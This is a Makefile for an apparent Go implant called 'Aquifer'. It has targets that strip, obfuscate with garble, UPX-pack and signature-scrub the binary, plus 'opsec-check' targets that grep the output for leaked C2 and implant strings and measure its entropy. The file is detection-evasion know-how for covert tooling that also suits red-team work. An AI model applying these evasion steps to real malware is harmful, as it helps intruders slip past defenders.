BINARY_NAME=implant
BUILD_DIR=build
GO=go
GARBLE=garble

# Version injection
VERSION ?= $(shell git describe --tags --always --dirty 2>/dev/null || echo "dev")
COMMIT  ?= $(shell git rev-parse --short HEAD 2>/dev/null || echo "unknown")
BUILD_DATE ?= $(shell date -u +%Y-%m-%dT%H:%M:%SZ)
VERSION_PKG=github.com/Real-Fruit-Snacks/Aquifer/pkg/version
VERSION_FLAGS=-X $(VERSION_PKG).Version=$(VERSION) -X $(VERSION_PKG).Commit=$(COMMIT) -X $(VERSION_PKG).BuildDate=$(BUILD_DATE)

# Strip symbols, debug info, buildinfo; static link
LDFLAGS=-ldflags="-s -w -buildid= $(VERSION_FLAGS) -extldflags '-static'"
TRIMPATH=-trimpath
CMD=cmd/implant/main.go

# Build tags to exclude debug/test code in release
RELEASE_TAGS=-tags release

.PHONY: all build build-arm64 build-garble build-all build-release upx clean vet test test-race coverage lint fmt check size strings-check gobuild-check opsec-check version help

all: build

# Development build — stripped and static but not obfuscated
build:
	mkdir -p $(BUILD_DIR)
	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 $(GO) build $(TRIMPATH) $(LDFLAGS) -o $(BUILD_DIR)/$(BINARY_NAME) $(CMD)

build-arm64:
	mkdir -p $(BUILD_DIR)
	CGO_ENABLED=0 GOOS=linux GOARCH=arm64 $(GO) build $(TRIMPATH) $(LDFLAGS) -o $(BUILD_DIR)/$(BINARY_NAME)-arm64 $(CMD)

# Obfuscated build — garble strips Go metadata, -literals encrypts string constants
build-garble:
	mkdir -p $(BUILD_DIR)
	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 $(GARBLE) -tiny -literals build $(TRIMPATH) $(LDFLAGS) -o $(BUILD_DIR)/$(BINARY_NAME)-garble $(CMD)

# Full release build — garble + UPX compressed + signature scrub (production deployment)
build-release:
	mkdir -p $(BUILD_DIR)
	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 $(GARBLE) -tiny -literals build $(TRIMPATH) $(LDFLAGS) $(RELEASE_TAGS) -o $(BUILD_DIR)/$(BINARY_NAME)-release $(CMD)
	@if command -v upx >/dev/null 2>&1; then \
		upx --best --lzma $(BUILD_DIR)/$(BINARY_NAME)-release 2>/dev/null || true; \
		echo "UPX compressed"; \
		python3 scripts/patch_upx.py $(BUILD_DIR)/$(BINARY_NAME)-release; \
	else \
		echo "UPX not found, skipping compression"; \
	fi

build-all: build build-arm64

upx:
	upx --best --lzma $(BUILD_DIR)/$(BINARY_NAME)

clean:
	rm -rf $(BUILD_DIR)
	@# Clean garble cache directories if present
	@find . -maxdepth 2 -type d -regex '.*/[0-9a-f][0-9a-f]' -path '*/build/*' -exec rm -rf {} + 2>/dev/null || true

vet:
	$(GO) vet ./...

test:
	$(GO) test ./...

test-race:
	$(GO) test -race ./...

coverage:
	$(GO) test -coverprofile=coverage.out ./...
	$(GO) tool cover -func=coverage.out
	@echo "HTML report: go tool cover -html=coverage.out"

lint: vet
	@command -v staticcheck >/dev/null 2>&1 || { echo "Install: go install honnef.co/go/tools/cmd/staticcheck@latest"; exit 1; }
	staticcheck ./...

tidy:
	$(GO) mod tidy

fmt:
	gofmt -s -w .

check: vet fmt build
	@echo "CI check passed"

size: build
	@ls -lh $(BUILD_DIR)/$(BINARY_NAME) | awk '{print "Binary size:", $$5, $$9}'

# Check binary for Go metadata leaks (type info, module paths, buildinfo)
strings-check: build
	@echo "=== Go Metadata Leak Check ==="
	@echo "--- Module paths ---"
	@strings $(BUILD_DIR)/$(BINARY_NAME) | grep -c "aquifer" || echo "0 matches (good)"
	@echo "--- Go buildinfo ---"
	@strings $(BUILD_DIR)/$(BINARY_NAME) | grep -cE "^(go[0-9]|path\s|mod\s|dep\s|build\s)" || echo "0 matches (good)"
	@echo "--- Suspicious patterns ---"
	@strings $(BUILD_DIR)/$(BINARY_NAME) | grep -iE "(password|token|secret|apikey|hardcoded|debug|c2server|implant|beacon|killswitch)" || echo "No suspicious patterns found"
	@echo "--- Go runtime signatures ---"
	@strings $(BUILD_DIR)/$(BINARY_NAME) | grep -c "runtime.main" || echo "0 matches (good)"

# OPSEC verification for release binary — checks all leak categories
opsec-check:
	@if [ ! -f $(BUILD_DIR)/$(BINARY_NAME)-release ]; then \
		echo "Release binary not found. Run: make build-release"; \
		exit 1; \
	fi
	@echo "=== OPSEC Check: $(BUILD_DIR)/$(BINARY_NAME)-release ==="
	@echo -n "Module paths:    " && (strings $(BUILD_DIR)/$(BINARY_NAME)-release | grep -c "aquifer" || echo "0") && \
	echo -n "C2 URL:          " && (strings $(BUILD_DIR)/$(BINARY_NAME)-release | grep -c "api/v1/beacon" || echo "0") && \
	echo -n "Go runtime refs: " && (strings $(BUILD_DIR)/$(BINARY_NAME)-release | grep -cE "^runtime\." || echo "0") && \
	echo -n "UPX signatures:  " && (grep -boa "UPX!" $(BUILD_DIR)/$(BINARY_NAME)-release | wc -l) && \
	echo -n "Go sections:     " && (readelf -S $(BUILD_DIR)/$(BINARY_NAME)-release 2>/dev/null | grep -c "gosymtab\|gopclntab\|go.buildinfo" || echo "0") && \
	echo -n "Binary size:     " && du -h $(BUILD_DIR)/$(BINARY_NAME)-release | cut -f1 && \
	echo -n "Entropy:         " && python3 -c "import math,collections;d=open('$(BUILD_DIR)/$(BINARY_NAME)-release','rb').read();f=collections.Counter(d);print(f'{-sum((c/len(d))*math.log2(c/len(d)) for c in f.values()):.2f} bits/byte')" && \
	echo "--- PASS ---"

# Verify that garble actually stripped Go metadata vs regular build
gobuild-check:
	@echo "=== Comparing regular vs garble builds ==="
	@if [ -f $(BUILD_DIR)/$(BINARY_NAME) ] && [ -f $(BUILD_DIR)/$(BINARY_NAME)-garble ]; then \
		echo "Regular binary:"; \
		strings $(BUILD_DIR)/$(BINARY_NAME) | grep -c "aquifer" || echo "  module paths: 0"; \
		echo "Garble binary:"; \
		strings $(BUILD_DIR)/$(BINARY_NAME)-garble | grep -c "aquifer" || echo "  module paths: 0"; \
	else \
		echo "Build both targets first: make build build-garble"; \
	fi

version:
	@echo "$(VERSION) ($(COMMIT)) built $(BUILD_DATE)"

help:
	@echo "Aquifer Makefile targets:"
	@echo ""
	@echo "  build          Development build (stripped, static)"
	@echo "  build-arm64    Cross-compile for ARM64"
	@echo "  build-garble   Obfuscated build via garble"
	@echo "  build-release  Full release (garble + UPX + signature scrub)"
	@echo "  build-all      Build amd64 + arm64"
	@echo ""
	@echo "  test           Run unit tests"
	@echo "  test-race      Run tests with race detector"
	@echo "  coverage       Generate test coverage report"
	@echo "  vet            Run go vet"
	@echo "  lint           Run vet + staticcheck"
	@echo "  fmt            Format all Go source"
	@echo "  check          Full CI check (vet + fmt + build)"
	@echo ""
	@echo "  size           Show binary size"
	@echo "  strings-check  Check binary for metadata leaks"
	@echo "  opsec-check    OPSEC verification for release binary"
	@echo "  gobuild-check  Compare regular vs garble builds"
	@echo ""
	@echo "  clean          Remove build artifacts"
	@echo "  tidy           Run go mod tidy"
	@echo "  version        Show version info"
	@echo "  help           Show this help"
